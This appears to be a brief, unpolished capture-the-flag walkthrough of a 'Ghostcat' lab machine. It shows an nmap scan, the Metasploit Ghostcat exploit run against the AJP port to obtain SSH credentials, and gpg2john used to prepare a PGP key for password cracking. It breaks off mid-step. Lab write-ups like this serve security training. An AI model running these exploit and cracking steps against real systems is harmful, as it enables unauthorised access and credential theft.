THE MACHINE IS GHOSTCAT


For firts thing we run the tool name Nmap: 

	nmap -p- IPMACHINE

There are ports which they are:

	22/tcp   open  ssh
	53/tcp   open  domain
	8009/tcp open  ajp13
	8080/tcp open  http-proxy

we search on internet the information of they, the port 8009  use the protocol AJP(apache jserv protocol) and have an exploit called Ghostcat


For use this exploit we use metasploit tool's

open metasploit

	msfconsole

search the exploit

	search ghostcat

use that 
	
	use 0

set machine where use

	set RHOSTS <IP>

now run
	exploit 


we found the user and the password for ssh 
enter on ssh 
there are two file 

	credential.pgp tryhackme.asc

the file .asc have password for crack it we use john 	
generate the hash of file 

	gpg2john tryhackme.asc > hash.txt

now with jhon crak the pass


